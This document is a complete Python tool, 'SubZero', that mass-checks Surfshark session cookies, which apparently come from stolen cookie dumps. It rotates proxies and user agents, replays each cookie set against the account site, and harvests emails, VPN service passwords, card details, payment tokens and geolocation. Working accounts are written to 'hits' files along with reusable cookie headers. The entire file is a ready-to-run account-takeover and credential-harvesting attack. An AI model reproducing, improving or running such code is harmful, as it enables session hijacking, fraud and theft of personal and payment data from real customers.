#!/usr/bin/env python3
"""
SubZero — Surfshark Mass Cookie Checker  ·  v3
- Effective subscription = _shared.user.subscription (not furthest order)
- Expired detection: sub_status OR past expiry
- Session folder per run: results/<timestamp>/{hits,expired,dead}.txt
"""
import os
import re
import json
import base64
import time
import zipfile
import random
import asyncio
import argparse
import sys
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── Colours ──────────────────────────────────────────────────────────────────
class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RED    = "\033[38;5;196m"
    ORANGE = "\033[38;5;208m"
    AMBER  = "\033[38;5;214m"
    YELLOW = "\033[38;5;226m"
    GREEN  = "\033[38;5;46m"
    CYAN   = "\033[38;5;51m"
    BLUE   = "\033[38;5;39m"
    VIOLET = "\033[38;5;135m"
    PINK   = "\033[38;5;213m"
    WHITE  = "\033[38;5;255m"
    GREY   = "\033[38;5;245m"
    ICE    = "\033[38;5;159m"

BANNER = f"""{C.CYAN}{C.BOLD}
   ███████╗██╗   ██╗██████╗ ███████╗███████╗██████╗  ██████╗
   ██╔════╝██║   ██║██╔══██╗╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
   ███████╗██║   ██║██████╔╝  ███╔╝ █████╗  ██████╔╝██║   ██║
   ╚════██║██║   ██║██╔══██╗ ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
   ███████║╚██████╔╝██████╔╝███████╗███████╗██║  ██║╚██████╔╝
   ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝
{C.ICE}{C.DIM}          surfshark cookie checker  ·  v3.0{C.RESET}
{C.GREY}          ────────────────────────────────────────────{C.RESET}
{C.VIOLET}          for baby  ·  sable{C.RESET}
"""

# ── Config ───────────────────────────────────────────────────────────────────
WEB_HOST    = "https://my.surfshark.com"
ACCOUNT_URL = f"{WEB_HOST}/account/subscription/products"
WARMUP_URL  = f"{WEB_HOST}/"

DEFAULT_ZIP   = "cookies.zip"
DEFAULT_PROXY = "proxy.txt"
RESULTS_DIR   = "results"
CONCURRENCY   = 20
TIMEOUT       = 30

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

SEARCH_DIRS = [
    os.getcwd(),
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Documents",
    "/storage/emulated/0",
    os.path.expanduser("~"),
]

# ── Helpers ──────────────────────────────────────────────────────────────────
def resolve_path(name: str) -> Optional[str]:
    if not name:
        return None
    if os.path.isabs(name) and os.path.exists(name):
        return name
    for d in SEARCH_DIRS:
        cand = os.path.join(d, name)
        if os.path.exists(cand):
            return cand
    return None

def decode_jwt_payload(token: str) -> Optional[dict]:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        b = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(b))
    except Exception:
        return None

def jwt_seconds_left(token: str) -> Optional[int]:
    p = decode_jwt_payload(token)
    if not p or "exp" not in p:
        return None
    try:
        return int(p["exp"]) - int(time.time())
    except Exception:
        return None

def days_left_from_expiry(expires_iso: str) -> int:
    if not expires_iso or expires_iso == "-":
        return -99999
    try:
        s = expires_iso.replace("Z", "+00:00")
        dt = datetime.fromisoformat(s)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        delta = dt - datetime.now(timezone.utc)
        return delta.days
    except Exception:
        return -99999

def parse_proxy_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks5://", "socks4://")):
        return line
    parts = line.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if "@" in line:
        auth, host = line.rsplit("@", 1)
        return f"http://{auth}@{host}"
    return None

def load_proxies(path: Optional[str]) -> list[str]:
    if not path or not os.path.exists(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = parse_proxy_line(line)
            if p:
                out.append(p)
    return out

# ── Cookie parsers ───────────────────────────────────────────────────────────
def parse_json_cookies(text: str) -> dict:
    data = json.loads(text)
    if isinstance(data, dict) and "cookies" in data:
        data = data["cookies"]
    return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}

def parse_netscape_cookies(text: str) -> dict:
    out = {}
    for line in text.splitlines():
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            out[parts[5]] = parts[6]
    return out

def parse_header_string(text: str) -> dict:
    out = {}
    for chunk in text.replace("\n", ";").split(";"):
        chunk = chunk.strip()
        if not chunk or "=" not in chunk:
            continue
        name, _, value = chunk.partition("=")
        out[name.strip()] = value.strip()
    return out

def detect_and_parse(text: str) -> dict:
    t = text.strip()
    if not t:
        return {}
    if t.startswith(("[", "{")):
        try:
            return parse_json_cookies(t)
        except Exception:
            pass
    if "\t" in t:
        p = parse_netscape_cookies(t)
        if p:
            return p
    return parse_header_string(t)

def load_accounts(zip_path: str) -> list[dict]:
    accounts = []
    with zipfile.ZipFile(zip_path, "r") as z:
        for name in z.namelist():
            if name.endswith("/"):
                continue
            try:
                raw = z.read(name).decode("utf-8", errors="ignore")
            except Exception:
                continue
            cookies = detect_and_parse(raw)
            if cookies:
                accounts.append({"name": name, "cookies": cookies})
    return accounts

def cookies_to_header(cookies: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in cookies.items())

def make_client(proxy: Optional[str]) -> httpx.AsyncClient:
    kwargs = {"timeout": TIMEOUT, "follow_redirects": True}
    if proxy:
        kwargs["proxy"] = proxy
    return httpx.AsyncClient(**kwargs)

# ── SSR parser ───────────────────────────────────────────────────────────────
def extract_initial_state(html: str) -> Optional[dict]:
    marker = "window.initialState="
    i = html.find(marker)
    if i == -1:
        return None
    start = i + len(marker)
    while start < len(html) and html[start] != "{":
        start += 1
    if start >= len(html):
        return None
    depth = 0
    end = start
    in_str = False
    escape = False
    while end < len(html):
        ch = html[end]
        if escape:
            escape = False; end += 1; continue
        if ch == "\\":
            escape = True; end += 1; continue
        if ch == '"':
            in_str = not in_str; end += 1; continue
        if not in_str:
            if ch == "{": depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    end += 1; break
        end += 1
    raw = html[start:end]
    try:
        return json.loads(raw)
    except Exception:
        try:
            return json.loads(re.sub(r',\s*([\]}])', r'\1', raw))
        except Exception:
            return None

# ── Extraction — EFFECTIVE subscription from _shared.user.subscription ───────
def extract_account(state: dict) -> dict:
    if not state:
        return {}

    shared      = state.get("_shared", {}) or {}
    shared_user = shared.get("user", {}) or {}
    details     = shared_user.get("details", {}) or {}
    sub_detail  = shared_user.get("subscription", {}) or {}
    user_info   = sub_detail.get("userInfo", {}) or {}

    top_sub = state.get("subscription", {}) or {}
    orders  = top_sub.get("orders") or sub_detail.get("orders") or []

    # ── Effective subscription state ──
    effective_expires = sub_detail.get("expiresAt") or ""
    effective_plan    = sub_detail.get("name") or ""
    effective_status  = sub_detail.get("status") or ""
    effective_price   = sub_detail.get("price") or {}
    effective_freq    = sub_detail.get("frequency") or "-"
    effective_funit   = sub_detail.get("frequencyUnit") or "-"
    effective_recur   = sub_detail.get("recurring", False)
    effective_trial   = sub_detail.get("activeTrial", False)

    # Fallback if stripped
    if not effective_expires:
        best_order, best_exp = {}, ""
        for o in orders:
            osub = o.get("subscription", {}) or {}
            exp = osub.get("expiresAt") or o.get("expiresAt") or ""
            if exp and exp > best_exp:
                best_exp = exp
                best_order = o
        osub = best_order.get("subscription", {}) or {}
        effective_expires = best_exp or "-"
        effective_plan    = osub.get("name") or top_sub.get("name") or "-"
        effective_status  = osub.get("status") or top_sub.get("status") or "-"
        effective_price   = osub.get("price") or top_sub.get("price") or {}
        effective_freq    = osub.get("frequency") or top_sub.get("frequency") or "-"
        effective_funit   = osub.get("frequencyUnit") or top_sub.get("frequencyUnit") or "-"
        effective_recur   = osub.get("recurring", False)
        effective_trial   = osub.get("activeTrial", False)

    # Payment methods
    payment_methods = []
    seen_tokens = set()
    for o in orders:
        pd = o.get("paymentDetails") or {}
        if not pd: continue
        tok = pd.get("paymentToken")
        if not tok or tok in seen_tokens: continue
        seen_tokens.add(tok)
        payment_methods.append({
            "token":     tok,
            "scheme":    pd.get("scheme"),
            "card_type": pd.get("cardType"),
            "last4":     pd.get("cardLastNumber"),
            "exp_month": pd.get("cardExpiredMonth"),
            "exp_year":  pd.get("cardExpiredYear"),
        })

    creds = details.get("serviceCredentials") or {}

    return {
        "email":          details.get("email") or "-",
        "customer_id":    details.get("id") or sub_detail.get("customerId") or "-",
        "username":       creds.get("username") or "-",
        "service_pass":   creds.get("password") or "-",
        "language":       details.get("language") or "-",
        "days_signed_up": details.get("daysAfterSignup") or "-",

        "plan":           effective_plan or "-",
        "sub_status":     effective_status or "-",
        "expires":        effective_expires or "-",
        "frequency":      effective_freq,
        "frequency_unit": effective_funit,
        "price":          (effective_price or {}).get("amount") or "-",
        "currency":       ((effective_price or {}).get("currency") or {}).get("code") or "-",
        "recurring":      effective_recur,
        "active_trial":   effective_trial,

        "orders_count":    len(orders),
        "payment_methods": payment_methods,

        "geo_country": user_info.get("country") or "-",
        "geo_city":    user_info.get("city") or "-",
        "geo_region":  user_info.get("region") or "-",
        "geo_ip":      user_info.get("ip") or "-",
        "geo_isp":     user_info.get("isp") or "-",
    }

def _fmt_payment_line(pms: list) -> str:
    if not pms:
        return "-"
    return " | ".join(
        f"{pm.get('scheme','?')} {pm.get('card_type','')} ****{pm.get('last4','')}"
        for pm in pms
    )

# ── Per-account check ────────────────────────────────────────────────────────
async def check_account(account: dict, proxy: Optional[str]) -> dict:
    name = account["name"]
    cookies = dict(account["cookies"])
    log: list[str] = []

    if "_sstk" not in cookies:
        return {"name": name, "status": "dead", "reason": "missing _sstk", "log": log}

    left = jwt_seconds_left(cookies["_sstk"])
    if left is None:
        note = "_sstk not a JWT"
    elif left < 0:
        note = f"expired {-left}s"
    else:
        note = f"valid {left}s"

    ua = random.choice(USER_AGENTS)

    ok_warmup = False
    for _ in range(3):
        try:
            async with make_client(proxy) as local:
                await local.get(WARMUP_URL, headers={
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Cookie": cookies_to_header(cookies),
                })
                for c in local.cookies.jar:
                    cookies[c.name] = c.value
            ok_warmup = True
            break
        except Exception:
            await asyncio.sleep(1.0)
    if not ok_warmup:
        return {"name": name, "status": "proxy_error",
                "reason": f"warmup failed :: [{note}]", "log": log}

    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": cookies_to_header(cookies),
        "Referer": f"{WEB_HOST}/home/",
        "Upgrade-Insecure-Requests": "1",
    }

    r = None
    for _ in range(2):
        try:
            async with make_client(proxy) as local:
                r = await local.get(ACCOUNT_URL, headers=headers)
            break
        except Exception:
            await asyncio.sleep(0.8)
    if r is None:
        return {"name": name, "status": "proxy_error",
                "reason": f"fetch failed :: [{note}]", "log": log}

    log.append(f"{r.status_code} · {len(r.text)}B")
    if r.status_code != 200 or "window.initialState" not in r.text:
        return {"name": name, "status": "dead",
                "reason": f"HTTP {r.status_code} :: [{note}]", "log": log}

    state = extract_initial_state(r.text)
    if not state:
        return {"name": name, "status": "dead",
                "reason": f"parse failed :: [{note}]", "log": log}

    info = extract_account(state)

    if not (info.get("email") or info.get("plan") or info.get("orders_count")):
        return {"name": name, "status": "dead",
                "reason": f"no data :: [{note}]", "log": log}

    # ── Effective expired detection ──
    days = days_left_from_expiry(info.get("expires", ""))
    sub_status = (info.get("sub_status") or "").lower()
    status_dead = sub_status in ("expired", "canceled", "trial_expired")
    is_expired = status_dead or days < 0

    info["days_left"] = days
    info["is_expired"] = is_expired

    return {
        "name": name,
        "reason": "ok",
        "note": note,
        "cookies": cookies,
        "header": cookies_to_header(cookies),
        **info,
        "status": "expired" if is_expired else "live",
        "log": log,
    }

# ── Live stats panel ─────────────────────────────────────────────────────────
class Stats:
    def __init__(self, total: int, workers: int):
        self.total   = total
        self.workers = workers
        self.live    = 0
        self.expired = 0
        self.dead    = 0
        self.errors  = 0
        self.done    = 0
        self.start   = time.time()
        self.lock    = asyncio.Lock()

    def _bar(self, width: int = 24) -> str:
        if self.total == 0:
            return "░" * width
        filled = int(width * self.done / self.total)
        return f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (width - filled)}{C.RESET}"

    def render(self) -> str:
        elapsed = time.time() - self.start
        mins, secs = divmod(int(elapsed), 60)
        hrs, mins = divmod(mins, 60)
        if hrs:
            t = f"{hrs}h{mins:02d}m"
        elif mins:
            t = f"{mins}m{secs:02d}s"
        else:
            t = f"{secs}s"
        cps = self.done / elapsed if elapsed > 0 else 0

        out = []
        out.append(f"{C.CYAN}{C.BOLD}[ SUBZERO ]{C.RESET}  {C.ICE}live stats{C.RESET}")
        out.append(f"{C.GREY}─────────────────────────────{C.RESET}")
        out.append(f" {C.AMBER}▸ progress {C.RESET}  {self._bar()}  {C.WHITE}{self.done}{C.GREY}/{self.total}{C.RESET}")
        out.append(f" {C.GREEN}▸ live     {C.RESET}  {C.GREEN}{self.live}{C.RESET}")
        out.append(f" {C.ORANGE}▸ expired  {C.RESET}  {C.ORANGE}{self.expired}{C.RESET}")
        out.append(f" {C.RED}▸ dead     {C.RESET}  {C.RED}{self.dead}{C.RESET}")
        out.append(f" {C.YELLOW}▸ errors   {C.RESET}  {C.YELLOW}{self.errors}{C.RESET}")
        out.append(f" {C.VIOLET}▸ workers  {C.RESET}  {C.VIOLET}{self.workers}{C.RESET}   "
                   f"{C.ICE}▸ {cps:.1f}/s{C.RESET}   {C.ICE}▸ {t}{C.RESET}")
        return "\n".join(out)

    async def bump(self, kind: str):
        async with self.lock:
            self.done += 1
            if kind == "live":       self.live    += 1
            elif kind == "expired":  self.expired += 1
            elif kind == "dead":     self.dead    += 1
            else:                    self.errors  += 1

def clear_screen():
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()

async def draw_loop(stats: Stats, stop_event: asyncio.Event):
    while not stop_event.is_set():
        clear_screen()
        print(BANNER)
        print(stats.render())
        await asyncio.sleep(0.5)

# ── Hit saving ───────────────────────────────────────────────────────────────
_hits_lock = asyncio.Lock()

def _format_hit(rank: int, r: dict, tag: str = "") -> str:
    days = r.get("days_left", -99999)
    if days >= 0:
        days_str = f"{days}d"
    else:
        days_str = f"EXPIRED {abs(days)}d ago"

    payment_line = _fmt_payment_line(r.get("payment_methods", []))
    header = f"#{tag}Hit{rank}" if tag else f"#Hit{rank}"

    return (
        f"{header}\n"
        f"📧 Mail : {r.get('email','-')}\n"
        f"🪩 Days Left : {days_str}\n"
        f"💖 Subscription: {r.get('plan','-')}\n"
        f"🔥 Billed Via : {payment_line} | $ {r.get('price','-')} {r.get('currency','')}\n"
        f"🍪 Cookie : {r.get('header','')}\n"
    )

async def save_hit_txt(path: str, r: dict, counter: dict, tag: str = ""):
    async with _hits_lock:
        counter["n"] += 1
        with open(path, "a", encoding="utf-8") as f:
            f.write(_format_hit(counter["n"], r, tag) + "\n===================================\n\n")

# ── Runner ───────────────────────────────────────────────────────────────────
async def run(zip_path: str, proxy_path: Optional[str], workers: int):
    proxies = load_proxies(proxy_path)
    accounts = load_accounts(zip_path)

    if not accounts:
        print(f"{C.RED}no accounts in {zip_path}{C.RESET}")
        return

    run_id = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    session_dir = os.path.join(RESULTS_DIR, run_id)
    os.makedirs(session_dir, exist_ok=True)
    hits_file    = os.path.join(session_dir, "hits.txt")
    expired_file = os.path.join(session_dir, "expired.txt")
    dead_file    = os.path.join(session_dir, "dead.txt")

    for fp in (hits_file, expired_file, dead_file):
        open(fp, "w", encoding="utf-8").close()

    stats = Stats(len(accounts), workers)
    sem = asyncio.Semaphore(workers)
    stop_event = asyncio.Event()

    hits_counter    = {"n": 0}
    expired_counter = {"n": 0}

    draw_task = asyncio.create_task(draw_loop(stats, stop_event))

    async def bound(acc):
        async with sem:
            proxy = random.choice(proxies) if proxies else None
            try:
                r = await check_account(acc, proxy)
            except Exception as e:
                r = {"name": acc["name"], "status": "error",
                     "reason": f"{type(e).__name__}: {str(e)[:60]}", "log": []}
            kind = r["status"]
            if kind == "live":
                await save_hit_txt(hits_file, r, hits_counter, tag="")
            elif kind == "expired":
                await save_hit_txt(expired_file, r, expired_counter, tag="Expired")
            elif kind == "dead" and r.get("reason"):
                async with _hits_lock:
                    with open(dead_file, "a", encoding="utf-8") as f:
                        f.write(f"{r['name']} :: {r.get('reason','')}\n")
            await stats.bump(kind)
            return r

    results = await asyncio.gather(*[bound(a) for a in accounts])

    stop_event.set()
    await draw_task

    clear_screen()
    print(BANNER)
    print(stats.render())
    print()
    print(f"{C.GREEN}live hits {C.RESET}   -> {C.WHITE}{hits_file}{C.RESET}")
    print(f"{C.ORANGE}expired   {C.RESET}   -> {C.WHITE}{expired_file}{C.RESET}")
    print(f"{C.RED}dead      {C.RESET}   -> {C.WHITE}{dead_file}{C.RESET}")
    print()

    print(f"{C.ICE}━━━ LIVE HITS ━━━{C.RESET}")
    any_hit = False
    for r in results:
        if r["status"] == "live":
            any_hit = True
            d = r.get("days_left", -99999)
            print(f"  {C.GREEN}✔{C.RESET} {C.WHITE}{r.get('email','-')}{C.RESET} "
                  f"{C.GREY}·{C.RESET} {C.AMBER}Premium{C.RESET} "
                  f"{C.GREY}•{C.RESET} {C.ICE}{d}d left{C.RESET}")
    if not any_hit:
        print(f"  {C.GREY}none{C.RESET}")

    print()
    print(f"{C.ORANGE}━━━ EXPIRED ━━━{C.RESET}")
    any_exp = False
    for r in results:
        if r["status"] == "expired":
            any_exp = True
            d = r.get("days_left", -99999)
            tag = f"Expired {abs(d)}d ago" if d != -99999 else "Expired"
            print(f"  {C.ORANGE}✘{C.RESET} {C.WHITE}{r.get('email','-')}{C.RESET} "
                  f"{C.GREY}·{C.RESET} {C.ORANGE}{tag}{C.RESET}")
    if not any_exp:
        print(f"  {C.GREY}none{C.RESET}")
    print()

# ── CLI ──────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="SubZero — Surfshark mass cookie checker v3")
    p.add_argument("--zip",     default=DEFAULT_ZIP,        help=f"cookies zip (default: {DEFAULT_ZIP})")
    p.add_argument("--proxy",   default=None,               help=f"proxy file (default: {DEFAULT_PROXY})")
    p.add_argument("--workers", type=int, default=CONCURRENCY, help=f"concurrency (default: {CONCURRENCY})")
    args = p.parse_args()

    zip_path = resolve_path(args.zip)
    if not zip_path:
        print(f"{C.RED}zip not found in: {SEARCH_DIRS}{C.RESET}")
        sys.exit(1)

    proxy_path = None
    if args.proxy:
        proxy_path = resolve_path(args.proxy) or args.proxy
    else:
        proxy_path = resolve_path(DEFAULT_PROXY)

    try:
        asyncio.run(run(zip_path, proxy_path, args.workers))
    except KeyboardInterrupt:
        print(f"\n{C.RED}interrupted{C.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()